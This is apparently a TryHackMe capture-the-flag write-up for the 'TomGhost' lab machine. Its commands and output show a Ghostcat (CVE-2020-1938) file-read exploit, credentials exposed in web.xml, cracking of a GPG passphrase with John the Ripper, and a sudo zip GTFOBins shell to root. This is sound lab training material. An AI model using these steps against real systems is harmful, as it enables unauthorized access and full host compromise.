# [TryHackMe](https://tryhackme.com/room/tomghost): TomGhost Writeup  

---

# 🎯 Target Information

- **Platform:** TryHackMe
- **Machine Name:** TomGhost
- **Target IP:** 10.48.191.174
- **Difficulty:** Easy
- **Key Vulnerabilities:**
  - Ghostcat (AJP File Read)
  - Exposed SSH Credentials
  - Cracking GPG Private Key Passphrase
  - GPG Credential Disclosure
  - Misconfigured Sudo Permissions
  - Privilege Escalation via ZIP using GTFOBins

---

# 🔎 Enumeration

Perform a full TCP port scan.

```bash
nmap -n -Pn -sVC -p- --min-rate 5000 10.48.191.174
```

## Scan Results

```text
$ nmap -n -Pn -sVC -p- --min-rate 5000 10.48.191.174
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-22 09:35 -0700
Nmap scan report for 10.48.191.174
Host is up (0.079s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.43 seconds
```

### Findings

- **22** → SSH
- **53** → DNS
- **8009** → Apache AJP
- **8080** → Apache Tomcat 9.0.30

The exposed **AJP (8009)** service, combined with **Apache Tomcat 9.0.30**, suggests the target may be vulnerable to **Ghostcat (CNVD-2020-10487 / CVE-2020-1938)**.

---

# 🌐 Web Enumeration

Browse to port **8080**.

<img width="1918" height="938" alt="landing" src="https://github.com/user-attachments/assets/c09dfa2e-0cdc-415e-852f-395cb5ac9f83" />

The web server displays the default Apache Tomcat page.

<img width="1918" height="938" alt="manneger" src="https://github.com/user-attachments/assets/9a67a3c8-b475-48f4-8cac-61a665d25796" />

Attempting to access the **Manager Application** results in:

```text
403 Access Denied
```

No useful information is obtained through the web interface.

---

# 👻 Exploiting Ghostcat

Download the Ghostcat exploit.

```bash
wget https://raw.githubusercontent.com/00theway/Ghostcat-CNVD-2020-10487/refs/heads/master/ajpShooter.py
```

Use the exploit to read the Tomcat configuration file.

```bash
python3 ajpShooter.py http://<IP> 8009 /WEB-INF/web.xml read
```

## Result

Inside the `web.xml` file, the following credentials are discovered.

```text
$ python3 ajpShooter.py http://10.48.191.174  8009  /WEB-INF/web.xml read                            

/home/arc/Lab/tryhackme/ajpShooter.py:363: SyntaxWarning: invalid escape sequence '\ '
        _    _         __ _                 _            
      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
     //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
         |__/|_|                                        
                                                00theway,just for test
    

[<] 200 200
[<] Accept-Ranges: bytes
[<] ETag: W/"1261-1583902632000"
[<] Last-Modified: Wed, 11 Mar 2020 04:57:12 GMT
[<] Content-Type: application/xml
[<] Content-Length: 1261

<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
        skyfuck:8730281lkjlkjdqlksalks
  </description>

</web-app>
```

### Important Finding

The Tomcat configuration file exposes valid SSH credentials.

| Username | Password |
|----------|----------|
| skyfuck | 8730281lkjlkjdqlksalks |

---

# 🖥 Initial Access

Login through SSH.

```bash
ssh skyfuck@10.48.191.174
```

Verify the current user.

```bash
id ; whoami
```

## Result

```text
skyfuck@ubuntu:~$ id ; whoami
uid=1002(skyfuck) gid=1002(skyfuck) groups=1002(skyfuck)
skyfuck
skyfuck@ubuntu:~$ 
```

Successfully gained access as **skyfuck**.

---

# 🔍 Local Enumeration

List the contents of the home directory.

```bash
ls
```

## Result

```text
credential.pgp
tryhackme.asc
```

Two interesting files are present:

- `credential.pgp`
- `tryhackme.asc`

---

# 📤 Downloading the Files

Start a temporary HTTP server.

```bash
python3 -m http.server 9000
```

Download the files to the attacker machine.

```bash
wget http://<IP>:9000/tryhackme.asc
```

---

# 🔓 Cracking the GPG Passphrase

Convert the private key into a John-compatible hash.

```bash
gpg2john tryhackme.asc > hash.txt
```
The hash.
```
tryhackme:$gpg$*17*54*3072*713ee3f57cc950f8f89155679abe2476c62bbd286ded0e049f886d32d2b9eb06f482e9770c710abc2903f1ed70af6fcc22f5608760be*3*254*2*9*16*0c99d5dae8216f2155ba2abfcc71f818*65536*c8f277d2faf97480:::tryhackme <stuxnet@tryhackme.com>::tryhackme.asc
```

Crack the passphrase.

```bash
john hash.txt \
--wordlist=/usr/share/wordlists/rockyou.txt
```

## Result

```text
$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Created directory: /home/arc/.john
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexandru        (tryhackme)     
1g 0:00:00:00 DONE (2026-07-22 10:43) 10.00g/s 10740p/s 10740c/s 10740C/s theresa..trisha
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

The GPG private key passphrase is:

```text
alexandru
```

---

# 🔑 Decrypting the Credential File

Import the private key.

```bash
gpg --import tryhackme.asc
```
```
skyfuck@ubuntu:~$ gpg --import tryhackme.asc 
gpg: key C6707170: secret key imported
gpg: /home/skyfuck/.gnupg/trustdb.gpg: trustdb created
gpg: key C6707170: public key "tryhackme <stuxnet@tryhackme.com>" imported
gpg: key C6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: Total number processed: 2
gpg:               imported: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
skyfuck@ubuntu:~$
```
Decrypt the encrypted file.

```bash
gpg --decrypt credential.pgp
```

Enter the recovered passphrase.

```text
alexandru
```

## Result

```text
skyfuck@ubuntu:~$ gpg --decrypt credential.pgp 

You need a passphrase to unlock the secret key for
user: "tryhackme <stuxnet@tryhackme.com>"
1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)

gpg: gpg-agent is not available in this session
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

### Important Finding

Another set of credentials is recovered.

| Username | Password |
|----------|----------|
| merlin | asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j |

---

# 🚀 Privilege Escalation (skyfuck → merlin)

Switch to the **merlin** user.

```bash
su merlin
```

Verify the user.

```bash
id ; whoami
```

## Result

```text
skyfuck@ubuntu:~$ su merlin
Password: 

merlin@ubuntu:~$ id ; whoami
uid=1000(merlin) gid=1000(merlin) groups=1000(merlin),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)
merlin
merlin@ubuntu:~$ 
```

Successfully switched to the **merlin** account.

---

# 🏁 User Flag

Read the user flag.

```bash
cat /home/merlin/user.txt
```

## Result

```text
THM{********_**_**_*****}
```

---

# 🔍 Privilege Escalation (merlin → root)

Check the available sudo permissions.

```bash
sudo -l
```

## Result

```text
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
merlin@ubuntu:
```

### Important Finding

The `zip` binary can be abused using the **GTFOBins** technique.

<img width="1420" height="522" alt="image" src="https://github.com/user-attachments/assets/cfba4762-f07e-4b01-805c-b61bdf3a5675" />

Execute the following command.

```bash
sudo zip /tmp/ /etc/hosts -T -TT '/bin/sh #'
```

Verify the privileges.

```bash
id ; whoami
```

## Result

```text
merlin@ubuntu:~$ sudo zip /tmp/ /etc/hosts -T -TT '/bin/sh #'
  adding: etc/hosts (deflated 31%)
# id ;whoami
uid=0(root) gid=0(root) groups=0(root)
root
# 
```

Successfully escalated privileges to the **root** user.

---

# 🏁 Root Flag

Read the root flag.

```bash
cat /root/root.txt
```

## Result

```text
THM{***_**_****}
```

---

# 🧾 Summary

| Phase | Technique |
|--------|-----------|
| Enumeration | Nmap |
| Vulnerability Discovery | Ghostcat (CVE-2020-1938) |
| Initial Access | Exposed SSH Credentials |
| Credential Recovery | GPG Passphrase Cracking |
| User Pivot | Decrypted GPG Credentials |
| Privilege Escalation | GTFOBins (`zip`) |
| Root Access | Read Root Flag |

---

# 🚀 Key Takeaways

- Exposing the AJP connector can lead to arbitrary file disclosure through the **Ghostcat** vulnerability.
- Sensitive credentials should never be stored inside application configuration files.
- Strong encryption is ineffective if weak passphrases protect private keys.
- GPG-encrypted files may contain valuable credentials during post-exploitation.
- Misconfigured sudo permissions on trusted binaries such as **zip** can easily lead to full system compromise through GTFOBins.

---

## **Author:** [zer0arc4](https://github.com/zer0arc4)
